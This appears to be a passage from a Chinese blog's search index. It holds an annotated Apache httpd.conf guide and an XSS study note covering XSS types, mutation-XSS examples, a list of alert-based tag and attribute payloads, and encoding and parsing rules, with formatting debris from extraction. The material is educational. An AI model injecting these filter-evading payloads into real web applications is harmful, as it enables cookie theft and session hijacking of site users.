，而不做其它任何事情，也就是说，它只是定义了这个别名，它既没有实际应用这个别名，也不是把它设为默认的格式。因此，它不 会影响后续的 TransferLog指令。另外，LogFormat不能用一个别名来定义另一个别名。nickname不能包含百分号(%)。 关于format的格式，请参见Apache2.2官方文档中的自定义日志格式小节。 CustomLog设定日志的文件名和格式。 语法：CustomLog file|pipeformat|nickname [env=[!]environment-variable] 第一个参数指定了日志记录的位置，可以使用以下两种方式来设定： file 相对于ServerRoot的日志文件名。pipe 管道符”|”后面紧跟着一个把日志输出当作标准输入的处理程序路径。 第二个参数指定了写入日志文件的内容。它既可以是由前面的LogFormat指令定义的nickname ，也可以是直接按Apache2.2官方文档中的自定义日志格式小节所描述的规则定义的format字符串。 第三个参数是可选的，它根据服务器上特定的环境变量是否被设置来决定是否对某一特定的请求进行日志记录。如果这个特定的环境变量被设置(或者在”env=!name”的情况下未被设置)，那么这个请求将被记录。可以使用mod_setenvif和/或mod_rewrite模块来为每个请求设置环境变量。 TransferLog指定日志文件的位置。 语法：TransferLogfile|pipe 本指令除不允许直接定义日志格式或根据条件进行日志记录外，与CustomLog指令有完全相同的参数和功能。实际应用中，日志的格式是由最近的非别名定义的LogFormat指令指定。如果没有定义任何日志格式，则使用通用日志格式。 Alias映射URL到文件系统的特定区域。 语法：Alias URL-pathfile-path|directory-path Alias指令使文档可以被存储在DocumentRoot以外的本地文件系统中。以(%已解码的)url-path路径开头的URL可以被映射到以directory-path开头的本地文件。 如果对在DocumentRoot之外的某个目录建立了一个Alias ，则可能需要通过段明确的对目标目录设定访问权限。 ScriptAlias映射一个URL到文件系统并视之为CGI脚本目录。 语法：ScriptAlias URL-pathfile-path|directory-path ScriptAlias指令的行为与Alias指令相同，但同时它又标明此目录中含有应该由cgi-script处理器处理的CGI脚本。以URL-path开头的(%已解码的)的URL会被映射到由第二个参数指定的具有完整路径名的本地文件系统中的脚本。 ScriptSock：在以线程式MPM(worker)运行的Apache中设置用来与CGI守护进程通信的套接字文件名前缀(其后附加父进程 PID组成完整的文件名)。这个套接字将会用启动Apache服务器的父进程用户权限(通常是root)打开。为了维护与CGI脚本通讯的安全性，不允许其他用户拥有写入套接字所在目录的权限是很重要的。 DefaultType在服务器无法由其他方法确定内容类型时，发送的默认MIME内容类型。 语法：DefaultTypeMIME-type 默认：DefaultTypetext/plain AddType在给定的文件扩展名与特定的内容类型之间建立映射关系。 语法：AddType MIME-typeextension [extension] … MIME-type指明了包含extension扩展名的文件的媒体类型。这个映射关系会添加在所有有效的映射关系上，并覆盖所有相同的extension扩展名映射。 extension参数是不区分大小的，并且可以带或不带前导点。 ErrorDocument批示当遇到错误的时候服务器将给客户端什么样的应答。 语法：ErrorDocumenterror-code document error-code 服务器返回的错误代码 document 可以由一个斜杠(/)开头来指示一个本地URL(相对于DocumentRoot)，或是提供一个能被客户端解释的完整的URL。此外还能提供一个可以被浏览器显示的消息。比如： ErrorDocument500http://www.entage.net/err500.html ErrorDocument 404/errors/bad_urls.html ErrorDocument 403 “Sorrycan’t allow you access today” EnableMMAP指示httpd在递送中如果需要读取一个文件的内容，它是否可以使用内存映射。 语法：EnableMMAP On|Off 当处理一个需要访问文件中的数据的请求时，比如说当递送一个使用mod_include进行服务器端分析的文件时，如果操作系统支持，Apache将默认使用内存映射。 这种内存映射有时会带来性能的提高，但在某些情况下，您可能会需要禁用内存映射以避免一些操作系统的问题： 在一些多处理器的系统上，内存映射会减低一些httpd的性能； 在挂载了NFS的DocumentRoot上，若已经将一个文件进行了内存映射，则删除或截断这个文件会造成httpd因为分段故障而崩溃。 在可能遇到这些问题的服务器配置过程中，应当使用下面的命令来禁用内存映射： EnableMMAP Off对于挂载了NFS的文件夹，可以单独在段中指定禁用内存映射： &lt;Directory”/path-to-nfs-files”&gt;EnableMMAP Off EnableSendfile控制httpd是否可以使用操作系统内核的sendfile支持来将文件发送到客户端。 默认情况下，当处理一个请求并不需要访问文件内部的数据时(比如发送一个静态的文件内容)，如果操作系统支持，Apache将使用sendfile将文件内容直接发送到客户端而并不读取文件。 这个sendfile机制避免了分开的读和写操作以及缓冲区分配，但是在一些平台或者一些文件系统上，最好禁止这个特性来避免一些问题： 一些平台可能会有编译系统检测不到的有缺陷的sendfile支持，特别是将在其他平台上使用交叉编译得到的二进制文件运行于当前对sendfile支持有缺陷的平台时； 在Linux上启用IPv6时，使用sendfile将会触发某些网卡上的TCP校验和卸载bug； 当Linux运行在Itanium处理器上的时候，sendfile可能无法处理大于2GB的文件； 对于一个通过网络挂载了NFS文件系统的DocumentRoot (比如：NFS或SMB)，内核可能无法可靠的通过自己的缓冲区服务于网络文件。 如果出现以上情况，你应当禁用sendfile ： EnableSendfile Off 针对NFS或SMB，可以单独在段中指定禁用： &lt;Directory”/path-to-nfs-files”&gt;EnableSendfile Off include在服务器配置文件中包含其它配置文件。 语法：Includefile-path|directory-path Shell风格(fnmatch())的通配符可以用于按照字母顺序一次包含多个文件。另外，如果Include指向了一个目录而不是一个文件，Apache将读入该目录及其子目录下的所有文件，并 依照字母顺序将这些文件作为配置文件进行解析。但是并不推荐这么做，因为偶尔会有临时文件在这个目录中生成，从而导致httpd启动失败。 文件的路径可以是一个完整的绝对路径(以一个斜杠开头)，或是相对于ServerRoot目录的相对路径。 设置动态加载的DSO模块#如果需要提供基于文本文件的认证,加载此模块，否则注释掉 LoadModule authn_file_modulemodules/mod_authn_file.so #如果需要提供基于DBM文件的认证,加载此模块,否则注释掉 #LoadModule authn_dbm_modulemodules/mod_authn_dbm.so #如果需要提供匿名用户认证,加载此模块,否则注释掉 #LoadModule authn_anon_modulemodules/mod_authn_anon.so #如果需要提供基于SQL数据库的认证,加载此模块,否则注释掉 #LoadModule authn_dbd_modulemodules/mod_authn_dbd.so #如果需要在未正确配置认证模块的情况下简单拒绝一切认证信息,加载此模块,否则注释掉 LoadModuleauthn_default_module modules/mod_authn_default.so #此模块提供基于主机名、IP地址、请求特征的访问控制,Allow、Deny指令需要,推荐加载。 LoadModule authz_host_modulemodules/mod_authz_host.so #如果需要使用纯文本文件为组提供授权支持,加载此模块,否则注释掉 #LoadModuleauthz_groupfile_module modules/mod_authz_groupfile.so #如果需要提供基于每个用户的授权支持,加载此模块,否则注释掉 LoadModule authz_user_modulemodules/mod_authz_user.so #如果需要使用DBM文件为组提供授权支持,加载此模块,否则注释掉 #LoadModule authz_dbm_modulemodules/mod_authz_dbm.so #如果需要基于文件的所有者进行授权,加载此模块,否则注释掉 #LoadModuleauthz_owner_module modules/mod_authz_owner.so #如果需要在未正确配置授权支持模块的情况下简单拒绝一切授权请求,加载此模块,否则注释掉 LoadModuleauthz_default_module modules/mod_authz_default.so #如果需要提供基本的HTTP认证,加载此模块,否则注释掉,此模块至少需要同时加载一个认证支持模块和一个授权支持模块 LoadModule auth_basic_modulemodules/mod_auth_basic.so ##如果需要提供HTTP MD5摘要认证,加载此模块,否则注释掉,此模块至少需要同时加载一个认证支持模块和一个授权支持模块 #LoadModuleauth_digest_module modules/mod_auth_digest.so #此模块提供文件描述符缓存支持,从而提高Apache性能,推荐加载,但请小心使用 LoadModule file_cache_modulemodules/mod_file_cache.so #此模块提供基于URI键的内容动态缓存(内存或磁盘),从而提高Apache性能,必须与mod_disk_cache/mod_mem_cache同时使用,推荐加载 LoadModule cache_modulemodules/mod_cache.so #此模块为mod_cache提供基于磁盘的缓存管理,推荐加载 LoadModule disk_cache_modulemodules/mod_disk_cache.so #此模块为mod_cache提供基于内存的缓存管理,推荐加载 LoadModule mem_cache_modulemodules/mod_mem_cache.so #如果需要管理SQL数据库连接，为需要数据库功能的模块提供支持,加载此模块,否则注释掉(推荐) #LoadModule dbd_modulemodules/mod_dbd.so #此模块将所有I/O操作转储到错误日志中,会导致在日志中写入及其海量的数据,只建议在发现问题并进行调试的时候使用 #LoadModule dumpio_modulemodules/mod_dumpio.so #如果需要使用外部程序作为过滤器,加载此模块(不推荐),否则注释掉 #LoadModule ext_filter_modulemodules/mod_ext_filter.so #如果需要实现服务端包含文档(SSI)处理,加载此模块(不推荐),否则注释掉 #LoadModule include_modulemodules/mod_include.so #如果需要根据上下文实际情况对输出过滤器进行动态配置,加载此模块,否则注释掉 LoadModule filter_modulemodules/mod_filter.so #如果需要服务器在将输出内容发送到客户端以前进行压缩以节约带宽,加载此模块(推荐),否则注释掉 LoadModule deflate_modulemodules/mod_deflate.so ##如果需要记录日志和定制日志文件格式,加载此模块(推荐),否则注释掉 LoadModule log_config_modulemodules/mod_log_config.so #如果需要对每个请求的输入/输出字节数以及HTTP头进行日志记录,加载此模块,否则注释掉 #LoadModule logio_modulemodules/mod_logio.so #如果允许Apache修改或清除传送到CGI脚本和SSI页面的环境变量,加载此模块,否则注释掉 LoadModule env_modulemodules/mod_env.so #如果允许通过配置文件控制HTTP的”Expires:”和”Cache-Control:”头内容,加载此模块(推荐),否则注释掉 LoadModule expires_modulemodules/mod_expires.so #如果允许通过配置文件控制任意的HTTP请求和应答头信息,加载此模块,否则注释掉 LoadModule headers_modulemodules/mod_headers.so #如果需要实现RFC1413规定的ident查找,加载此模块(不推荐),否则注释掉 #LoadModule ident_modulemodules/mod_ident.so #如果需要根据客户端请求头字段设置环境变量,加载此模块,否则注释掉 LoadModule setenvif_modulemodules/mod_setenvif.so #此模块是mod_proxy的扩展,提供Apache JServ Protocol支持,只在必要时加载 #LoadModule proxy_ajp_modulemodules/mod_proxy_ajp.so #此模块是mod_proxy的扩展,提供负载均衡支持,只在必要时加载 #LoadModuleproxy_balancer_module modules/mod_proxy_balancer.so #如果需要根据文件扩展名决定应答的行为(处理器/过滤器)和内容(MIME类型/语言/字符集/编码),加载此模块,否则注释掉 LoadModule mime_modulemodules/mod_mime.so #如果允许Apache提供DAV协议支持,加载此模块,否则注释掉 #LoadModule dav_modulemodules/mod_dav.so #此模块生成描述服务器状态的Web页面,只建议在追踪服务器性能和问题时加载 #LoadModule status_modulemodules/mod_status.so #如果需要自动对目录中的内容生成列表(类似于”ls”或”dir”命令),加载此模块(会带来安全问题,不推荐),否则注释掉 #LoadModule autoindex_modulemodules/mod_autoindex.so #如果需要服务器发送自己包含HTTP头内容的文件,加载此模块,否则注释掉 #LoadModule asis_modulemodules/mod_asis.so #如果需要生成Apache配置情况的Web页面,加载此模块(会带来安全问题,不推荐),否则注释掉 #LoadModule info_modulemodules/mod_info.so #如果需要在非线程型MPM(prefork)上提供对CGI脚本执行的支持,加载此模块,否则注释掉 #LoadModule cgi_modulemodules/mod_cgi.so #此模块在线程型MPM(worker)上用一个外部CGI守护进程执行CGI脚本,如果正在多线程模式下使用CGI程序,推荐替换mod_cgi加载,否则注释掉 #LoadModule cgid_modulemodules/mod_cgid.so #此模块为mod_dav访问服务器上的文件系统提供支持,如果加载mod_dav,则也应加载此模块,否则注释掉 #LoadModule dav_fs_modulemodules/mod_dav_fs.so #如果需要提供大批量虚拟主机的动态配置支持,加载此模块,否则注释掉 #LoadModulevhost_alias_module modules/mod_vhost_alias.so #如果需要提供内容协商支持(从几个有效文档中选择一个最匹配客户端要求的文档),加载此模块(推荐),否则注释掉 LoadModule negotiation_modulemodules/mod_negotiation.so #如果需要指定目录索引文件以及为目录提供”尾斜杠”重定向,加载此模块(推荐),否则注释掉 LoadModule dir_modulemodules/mod_dir.so #如果需要处理服务器端图像映射,加载此模块,否则注释掉 #LoadModule imagemap_modulemodules/mod_imagemap.so #如果需要针对特定的媒体类型或请求方法执行CGI脚本,加载此模块,否则注释掉 #LoadModule actions_modulemodules/mod_actions.so #如果希望服务器自动纠正URL中的拼写错误,加载此模块(推荐),否则注释掉 LoadModule speling_modulemodules/mod_speling.so #如果允许在URL中通过”/~username”形式从用户自己的主目录中提供页面,加载此模块,否则注释掉 #LoadModule userdir_modulemodules/mod_userdir.so #此模块提供从文件系统的不同部分到文档树的映射和URL重定向,推荐加载 LoadModule alias_modulemodules/mod_alias.so #如果需要基于一定规则实时重写URL请求,加载此模块(推荐),否则注释掉 LoadModule rewrite_modulemodules/mod_rewrite.so 转自https://my.oschina.net/imecho/blog/1809646","link":"/2020/07/26/Others/Apache%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%88httpd-conf%EF%BC%89%E8%AF%A6%E8%A7%A3/"},{"title":"XSS学习","text":"XSS成因 通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或处理不严，则浏览器会直接执行用户注入的脚本。 XSS危害攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致 XSS 。 网络钓鱼，包括获取各类用户账号； 窃取用户 cookies 资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作； 劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等； 强制弹出广告页面、刷流量等； 网页挂马； 进行恶意操作，如任意篡改页面信息、删除文章等； 进行大量的客户端攻击，如ddos等； 获取客户端信息，如用户的浏览历史、真实ip、开放端口等； 控制受害者机器向其他网站发起攻击； 结合其他漏洞，如csrf,实施进一步危害； 提升用户权限，包括进一步渗透网站； 传播跨站脚本蠕虫等 容易产生XSS的地方1、与数据交互的地方 get、post、cookies、headers 反馈与浏览 富文本编辑器 各类标签插入和自定义 2、数据输出的地方 用户资料 关键词、标签、说明 文件上传 关于DOM什么是DOM？DOM全称是Document Object Model(文档对象模型)，是为HTML和XML提供的API。那么为什么DOM可以同时提供给HTML和XML编程接口。虽然他们用来标记的标签不同，但是他们本质的结构是相同的。换句话说，按照DOM的标准，HTML和XML都是以标签为结点构造的树结构，DOM将HTML和XML的相同的结构本质抽象出来，然后通过脚本语言，如Javascript，按照DOM里的模型标准访问和操作文档内容。 在Chrome浏览器端，单击右键打开View Page Source展示文档结构。通过这种方式可以直观的看到文档当前的内容和结构。DOM则不同，它是提供一个API给编程语言，比如Javascript，通过一系列抽象的方法操作文档的内容，结构和样式。这有点想SQL和Excel，Excel可以直观的展示数据的结构，而SQL是一个负责操作数据的工具，帮助组织，更新，添加和删除数据内容。 DOM 和 HTML是一回事吗？就像很多人把JQuery和Javascript的本质搞混一样，DOM和HTML也完全不是一回事，DOM是一个API，HTML(Hyper Text Markup Language)则是一种标记语言，HTML在DOM的模型标准中被视为对象，DOM只提供编程接口，却无法实际操作HTML里面的内容。 但是前端工程师，一般在浏览器端操作HTML。每个Web浏览器都会使用DOM，所以页面可以被脚本语言访问。而所有的浏览器都是以Javascript作为默认的脚本语言。所以HTML在浏览器端基本上可以直接通过DOM模型来操作，通过&lt;srcipt&gt;标签载入或者直接插入Javascript脚本，通过DOM直接操作浏览器端的HTML文件。正是这种无缝融合，导致DOM和HTML的概念很容易混淆。 DOM 和 JavaScript什么关系？Javascript可以通过DOM直接访问和操作网页文档的内容，一开始，DOM是为方便Javascript操作设计的API。但其实发展到后来，他们是两个独立的个体。而且Javascript不是唯一可以使用DOM的编程语言，比如python也可以访问DOM。所以DOM不是提供给Javascript的API，也不是Javascript里的API。但JavaScript可以通过DOM访问和操作HTML和XML文档内容。 Kinds Of Xss0x01 Reflected XSS Attacks介绍反射型XSS，攻击具有一次性，只在用户单击时出发，因为payload在触发时，是客户端渲染了服务器的响应体，payload经过了服务器，是与服务器产生了交互了的。 常见注入点网站的搜索框、用户登录入口、输入表单的地方，常用来切去客户端cookies火钓鱼欺骗 0x02 Dom Based XSS Attacts介绍DOM（Document Object Model），使用dom能够使程序和脚本动态访问和更新文档的内容、结构和样式。 DOM型XSS是一种特殊的反射型XSS。 特殊在于：DOM型XSS是基于js上的，不需要与服务器交互。 注入点通过js脚本对文档对象进行编辑，从而修改页面的元素。 也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。 由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。 攻击方式用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。 0x03 Stored XSS Atacks介绍存储型XSS，最具有威胁性，甚至可能影响到web服务器自身的安全。攻击脚本将被永久的存放在目标服务器的数据库或文件中。 常见注入点论坛、博客、留言板、评论、日志等需要存到服务器的地方。 攻击方式攻击者在发帖或留言的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行。 0x04 MXSS Atacks介绍突变型XSS（Mutation-Based Cross-Site-Scripting) Mutation 突变 不论是服务器端或客户端的XSS过滤器，都认定过滤后的HTML源代码应该与浏览器所渲染后的HTML代码保持一致，至少不会出现很大的出入。然而，如果用户所提供的富文本内容通过JavaScript代码进属性后，一些意外的变化会使这个认定变得不再成立。 一串看似没有任何危害的HTML代码，将逃过XSS过滤器的检测，最终进入某个DOM节点中，浏览器的渲染引擎会将本来没有任何危害的HTMl代码渲染成具有危险的XSS攻击代码。随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是以其他方式再次被渲染，从而导致XSS的执行。 一句话概括用于绕过渲染器和waf以及其他检测而构造的XSS-Payload 叫做 突变型XSS 常见的MXSS注入 反引号打破属性边界导致的mXSS Input: 1&lt;img src=&quot;test.jpg&quot; alt =&quot;``onload=xss()&quot; /&gt; Output: 1&lt;IMG alt =``onload=xss() src =&quot;test.jpg&quot;&gt; 未知元素中的 xmlns 属性所导致的 mXSS 一些浏览器不支持HTML5的标记，例如IE8，会将article，aside，menu等当作是未知的HTML标签。可以通过设置这些标签的xmlns 属性，让浏览器知道这些未知的标签是的XML命名空间是什么。但解释后却产生了突变： Input: 1&lt;pkav xmlns=&quot;&gt;&lt;iframe onload=alert(1)&quot;&gt;123&lt;/pkav&gt; Output: 1&lt;?XML:NAMESPACE PREFIX = [default] &gt;&lt;iframe onload=alert(1) NS = &quot;&gt;&lt;iframe onload=alert(1)&quot; /&gt;&lt;pkav xmlns=&quot;&gt;&lt;iframe onload=alert(1)&quot;&gt;123&lt;/pkav&gt; CSS中反斜线转义导致的mXSS css中允许使用\\来进行转义，但在在一起的时候，悲剧就产生了。 Input: 1&lt;p style=&quot;font-family:'ar\\27 \\3bx\\3a expression\\28xss\\28\\29\\29\\3bial';&quot;&gt;&lt;/p&gt; Output: 1&lt;P style=&quot;FONT-FAMILY: 'ar';x:xss());ial'&quot;&gt;&lt;/P&gt; CSS属性名中的转义所导致的mXSS \\22转义后产生的悲剧。 Input 1&lt;img src=1 style=&quot;font-fam\\22onerror\\3d alert\\28 1\\29\\20 ily:'aaa';&quot;&gt; Output 1&lt;IMG style=&quot;font-fam&quot;alert(1) ily: ''&quot; src=&quot;1&quot;&gt; Listing标签导致的mXSS Listing标签里面的东东会发生些奇葩事情： Input 1&lt;listing&gt;&lt;img src=1 onerror=alert(1) &amp;&lt;/listing&gt; Output 1&lt;LISTING&gt;&lt;img src=1 onerror=alert(1) &gt;&lt;/LISTING&gt; 0x05 UXSS介绍UXSS（Universal Cross-Site Scripting ）通用型XSS UXSS保留了基本XSS的特点，利用漏洞，执行恶意代码，但是有个重要的区别： 不同于常见的XSS，UXSS是一种利用浏览器或者浏览器扩展来制造产生XSS的条件并执行代码的一种攻击类型。 所以挖到这种洞，都能拿CVE了。 详情 https://www.fooying.com/uxss/ Payload以img、a、input、form、编码、iframe举例 img12345678&lt;img src=javascript:alert(&quot;xss&quot;)&gt;&lt;IMG SRC=javascript:alert(String.formCharCode(88,83,83))&gt;&lt;img scr=&quot;URL&quot; style='Xss:expression(alert(/xss));'&lt;!--CSS标记xss--&gt;&lt;img STYLE=&quot;background-image:url(javascript:alert('XSS'))&quot;&gt;&lt;img src=&quot;x&quot; onerror=alert(1)&gt;&lt;img src=&quot;1&quot; onerror=eval(&quot;alert('xss')&quot;)&gt;&lt;img src=1 onmouseover=alert('xss')&gt; a12345678&lt;a href=&quot;https://www.baidu.com&quot;&gt;baidu&lt;/a&gt;&lt;a href=&quot;javascript:alert('xss')&quot;&gt;aa&lt;/a&gt;&lt;a href=javascript:eval(alert('xss'))&gt;aa&lt;/a&gt;&lt;a href=&quot;javascript:aaa&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&lt;a href=&quot;&quot; onclick=alert('xss')&gt;aa&lt;/a&gt;&lt;a href=&quot;&quot; onclick=eval(alert('xss'))&gt;aa&lt;/a&gt;&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt('xss') y=2016&gt;aa&lt;/a&gt; input1234&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;input value=&quot;&quot; onclick=alert('xss') type=&quot;text&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt('xss') bad=&quot;&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt; form12345&lt;form action=javascript:alert('xss') method=&quot;get&quot;&gt;&lt;form action=javascript:alert('xss')&gt;&lt;form method=post action=aa.asp? onmouseover=prompt('xss')&gt;&lt;form method=post action=aa.asp? onmouseover=alert('xss')&gt;&lt;form action=1 onmouseover=alert('xss)&gt; 利用编码1234&lt;!--原code--&gt;&lt;form method=post action=&quot;data:text/html;base64,&lt;script&gt;alert('xss')&lt;/script&gt;&quot;&gt;&lt;!--base64编码--&gt;&lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; iframe12345678&lt;iframe src=javascript:alert('xss');height=5width=1000 /&gt;&lt;iframe&gt;&lt;iframe src=&quot;data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;&lt;!--原code--&gt;&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert('xss')&lt;/script&gt;&quot;&gt;&lt;!--base64编码--&gt;&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;&lt;iframe src=&quot;aaa&quot; onmouseover=alert('xss') /&gt;&lt;iframe&gt;&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;&quot;&gt;&lt;/iframe&gt; svg1&lt;svg onload=alert(1)&gt; 关于加密0x01 五类HTMl元素 空元素(Void elements)，如 1&lt;area&gt; &lt;br&gt; &lt;base&gt; 等 原始文本元素(Raw text elements)，有 &lt;script&gt; &lt;style&gt; 12345 - RCDATA元素(RCDATA elements)，有 &lt;textarea&gt; &lt;title&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081 - 外部元素(Foreign elements)，例如 MathML 命名空间或者 SVG 命名空间的元素- 基本元素(Normal elements)，即除了以上4种元素以外的元素### 五类元素的区别1. 空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签之间）。2. 原始文本元素，可以容纳文本。3. RCDATA元素，可以容纳文本和字符引用。4. 外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释。5. 基本元素，可以容纳文本、字符引用、其他元素和注释。## 0x02 URL Ecode一个百分号和该字符的ASCII编码所对应的2位16进制数字，例如 / 的URL编码为 %2F（大小写均可以）## 0x03 Character Entity(字符实体)在呈现HTML页面时，针对某些特殊字符如`&lt;`或`&gt;`直接使用，浏览器会误以为它们的标签的开始或结束，若想正确的在HTML页面呈现特殊字符就需要用到其对应的字符实体。字符实体时一个预先定义好的转义序列，它定义了一些无法在文本内容中输出的字符或符号。### 可容纳字符实体的三种特殊情况：- 数据状态中的字符引用- RCDATA状态中的字符引用- 属性值状态中的字符引用在这些状态中HTML字符实体将会从“&amp;#...”形势解码，对应的解码字符会被放入数据缓冲区中。### 字符实体和字符编号#### 字符实体字符实体以`&amp;`开头+与定义的实体名称，以分号结尾，如`&lt;`的编码为`&lt;`实体名称（Entity）是区分大小写的#### 实体编号以`&amp;`开头+`#`符号以及字符的十进制数字，如&lt;的实体编号为`&amp;#60;`字符都是有实体编号的但有些字符没有实体名称。![image-20191016135842479](XSS学习/image-20191016135842479.png)#### **备注**同一个符号，可以用“实体名称”和“实体编号”两种方式引用，“实体名称”的优势在于便于记忆，但不能保证所有的浏览器都能顺利识别它，而“实体编号”则没有这种担忧，但它实在不方便记忆。## 0x04 Javascript Encode1. 三个八进制数字，如果不够个数，前面补0，例如“e”编码为“\\145”2. 两个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\\x65”3. 四个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\\u0065”4. 对于一些控制字符，使用特殊的C类型的转义风格（例如\\n和\\r）5. jsfuck编码## 0x05 Javascript 内置的编码函数\\####String.fromCharCode String.fromCharCode(97,108,101,114,116) 12345678910111213141516171819202122232425262728293031323334这里是`alert`的编码# Render（渲染）这部分强烈推荐仔细阅读[Deep dive into browser parsing and XSS payload encoding](https://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html)，文章讲的很详细了，我这里浓缩一下。## 原理1、浏览器在解析HTML文档时无论按照什么顺序，主要有三个过程：HTML解析、JS解析和URL解析，每个解析器负责HTML文档中各自对应部分的解析工作。2、首先浏览器接收到一个HTML文档时，会触发HTML文档进行词法解析，这一过程完成HTML解码并创建DOM树，接下来javaScript解析起会介入对内敛脚本进行解析，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析起也会介入完成URL的解码工作，URL解析起的解码顺序会根据URL所在的位置不同，可能在Javascript解析器之前或者之后解析。## 浏览器的解析规则（顺序）：1. 浏览器收到HTML内容后，从头开始HTML解析。2. 使用JS解析起解析。3. 使用URL解析器解析。4. 使用CSS解析器解析。## 三种状态### 数据状态中的字符引用 &lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt; 1234567891011例如，在这个例子中，`&lt;`和`&gt;`字符被编码为`&lt;`和`&gt;`。当解析器解析完`&lt;div&gt;`并处于“数据状态”时，这两个字符将会被解析。当解析器遇到`&amp;`字符，它会知道这是”数据状态的字符引用”，因此会消耗一个字符引用（例如`&lt;`）并释放出对应字符的 token 。在这个例子中，对应字符指的是`&lt;`和`&gt;`。你可能会想：这是不是意味着`&lt;`和`&gt;`的token将会被理解为标签的开始和结束，然后其中的脚本会被执行？答案是脚本并不会被执行。原因是解析器在解析这个字符引用后不会转换到”标签开始状态”。正因为如此，就不会建立新标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成”数据”。### RCDATA状态中的字符引用 &lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt; 1234567891011这意味着在``和``标签中的字符引用会被 HTML 解析器解码。这里要再提醒一次，在解析这些字符引用的过程中不会进入“标签开始状态”。这样就可以解释这段代码了。另外，对 RCDATA 有个特殊的情况。在浏览器解析 RCDATA 元素的过程中，解析器会进入”RCDATA状态”。在这个状态中，如果遇到`&lt;`字符，它会转换到”RCDATA小于号状态”。如果`&lt;`字符后没有紧跟着`/`和对应的标签名，解析器会转换回”RCDATA状态”。这意味着在 RCDATA 元素标签的内容中（例如``或``的内容中），唯一能够被解析器认做是标签的就是``或者``。当然，这要看开始标签是哪一个。因此，在``和``的内容中不会创建标签，就不会有脚本能够执行。这也就解释了为什么问题中的脚本不会被执行。我们来迅速看一下 CDATA 元素。任何在 CDATA 元素中的内容将不会触发解析器创建开始标签。闭合 CDATA 元素的标志是`]]&gt;`序列。因此如果用户想逃出 CDATA 元素，就要用未经任何编码的`]]&gt;`序列，不然是不会逃出 CDATA 元素的。### 属性值状态中的字符引用 &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61 %6c%65%72%74%28%32%29&quot;&gt; 1234567891011121314151617181920212223242526272829303132333435363738394041在这个情况中字符引用会被解码。在这里，HTML 解析器解析了文档，创建了标签 token，并且对 href 属性里的字符实体进行了解码。然后，当 HTML 解析器工作完成后，URL 解析器开始解析 href 属性值里的链接。在这时， javascript 协议已经被解码，它能够被 URL 解析器正确识别。然后 URL 解析器继续解析链接剩下的部分。由于是 javascript 协议，JavaScript 解析器开始工作并执行这段代码，这就是为什么问题中的代码能够被执行。### JavaScript解析JavaScript解析过程与HTML解析过程有点不一样。script 块有个有趣的属性：在块中的字符引用并不会被解析和解码。如果你去看“脚本数据状态”的状态转换规则，就会发现没有任何规则能转移到字符引用状态。所以如果攻击者尝试着将输入数据编码成字符实体并将其放在script 块中，它将不会被执行。像`\\uXXXX`（例如`\\u0000`,`\\u000A`）这样的字符，JavaScript 会视情况而定解析这些字符来执行。具体的说就是要看被编码的序列到底是哪部分。首先，像`\\uXXXX`一样的字符被称作 &lt;u&gt;*Unicode 转义序列*&lt;/u&gt;。从上下文来看，你可以将转义序列放在3个部分：字符串中，标识符名称中和控制字符中。#### 1、字符串中当 Unicode 转义序列存在于字符串中时，它只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。这项内容清楚地写在 ECMAScript 中。因此，*&lt;u&gt;Unicode 转义序列将永远不会破环字符串上下文，因为它们只能被解释成字符串常量。&lt;/u&gt;*#### 2、标识符名称中当 Unicode 转义序列出现在标识符名称中时，它会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。如果我们深入研究 JavaScript 细则，可以看到如下内容：&gt; 